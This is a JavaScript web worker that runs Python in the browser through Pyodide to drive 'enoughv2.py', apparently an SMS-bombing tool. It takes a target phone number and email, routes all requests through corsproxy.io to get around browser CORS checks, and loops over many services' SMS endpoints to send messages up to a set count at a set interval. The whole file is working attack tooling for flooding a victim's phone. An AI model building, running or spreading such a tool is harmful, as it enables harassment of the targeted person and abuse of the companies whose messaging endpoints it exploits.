importScripts("https://cdn.jsdelivr.net/pyodide/v0.25.0/full/pyodide.js");

let pyodide = null;
let enoughCode = "";

// Listen for messages from the main UI thread
self.onmessage = async function(e) {
    const { type, data } = e.data;
    
    if (type === 'init') {
        try {
            self.postMessage({ type: 'status', text: 'Pyodide (WebAssembly) yükleniyor...' });
            pyodide = await loadPyodide();
            
            self.postMessage({ type: 'status', text: 'Paket yükleyici (micropip) hazırlanıyor...' });
            await pyodide.loadPackage('micropip');
            
            self.postMessage({ type: 'status', text: 'Gerekli kütüphaneler kuruluyor (requests)...' });
            await pyodide.runPythonAsync(`
                import micropip
                await micropip.install('requests')
                await micropip.install('pyodide-http')
            `);
            
            self.postMessage({ type: 'status', text: 'CORS Proxy yaması uygulanıyor...' });
            await pyodide.runPythonAsync(`
                import pyodide_http
                pyodide_http.patch_all()
                
                import requests
                original_post = requests.post
                original_get = requests.get
                
                # Override requests to proxy all HTTP traffic through corsproxy.io to bypass browser CORS checks
                def patched_post(url, *args, **kwargs):
                    if not url.startswith('http') or 'corsproxy.io' in url:
                        return original_post(url, *args, **kwargs)
                    proxied_url = f"https://corsproxy.io/?{url}"
                    return original_post(proxied_url, *args, **kwargs)
                    
                def patched_get(url, *args, **kwargs):
                    if not url.startswith('http') or 'corsproxy.io' in url:
                        return original_get(url, *args, **kwargs)
                    proxied_url = f"https://corsproxy.io/?{url}"
                    return original_get(proxied_url, *args, **kwargs)
                    
                requests.post = patched_post
                requests.get = patched_get
            `);
            
            // Get enoughv2.py source code passed from UI and write to virtual FS
            enoughCode = data.code;
            pyodide.FS.writeFile("enoughv2.py", enoughCode);
            
            // Fetch list of available services
            self.postMessage({ type: 'status', text: 'Servis listesi ayrıştırılıyor...' });
            const servicesJson = await pyodide.runPythonAsync(`
                import json
                from enoughv2 import SendSms, servisler_sms
                json.dumps(servisler_sms)
            `);
            const services = JSON.parse(servicesJson);
            
            self.postMessage({ type: 'ready', services: services });
        } catch (err) {
            self.postMessage({ type: 'error', error: err.toString() });
        }
    }
    
    else if (type === 'start') {
        const { phone, mail, count, interval, turbo, threads, services } = data;
        
        try {
            // Callback to send prints/logs back to JavaScript UI
            pyodide.globals.set("send_log_to_js", function(text) {
                self.postMessage({ type: 'log', text: text });
            });
            
            await pyodide.runPythonAsync(`
                import builtins
                import time
                import re
                from enoughv2 import SendSms, split_services, servisler_sms
                from concurrent.futures import ThreadPoolExecutor, wait
                
                # Redirect print to our JS callback
                def web_print(*args, **kwargs):
                    text = " ".join(str(arg) for arg in args)
                    send_log_to_js(text)
                
                builtins.print = web_print
                
                # Setup variables
                running = True
                sms = SendSms("${phone}", "${mail}")
                selected_services = ${JSON.stringify(services)}
                if not selected_services:
                    selected_services = servisler_sms
                
                def run_loop():
                    global running
                    target_limit = ${count}
                    aralik = ${interval}
                    
                    while running:
                        for service in selected_services:
                            if not running:
                                break
                            if target_limit > 0 and sms.adet >= target_limit:
                                send_log_to_js("Gönderim adeti limitine ulaşıldı.")
                                running = False
                                break
                                
                            try:
                                method = getattr(sms, service)
                                method()
                            except Exception as e:
                                print(f"[-] Hata! {service} çağrılırken hata: {str(e)}")
                                
                            if aralik > 0:
                                # Sleep in smaller chunks to remain responsive to stop command
                                sleep_start = time.time()
                                while time.time() - sleep_start < aralik:
                                    if not running:
                                        return
                                    time.sleep(0.05)
                                    
                        if target_limit > 0 and sms.adet >= target_limit:
                            break
                            
                run_loop()
            `);
            
            self.postMessage({ type: 'finished' });
        } catch (err) {
            self.postMessage({ type: 'error', error: err.toString() });
        }
    }
    
    else if (type === 'stop') {
        if (pyodide) {
            await pyodide.runPythonAsync(`
                running = False
            `);
            self.postMessage({ type: 'stopped' });
        }
    }
};
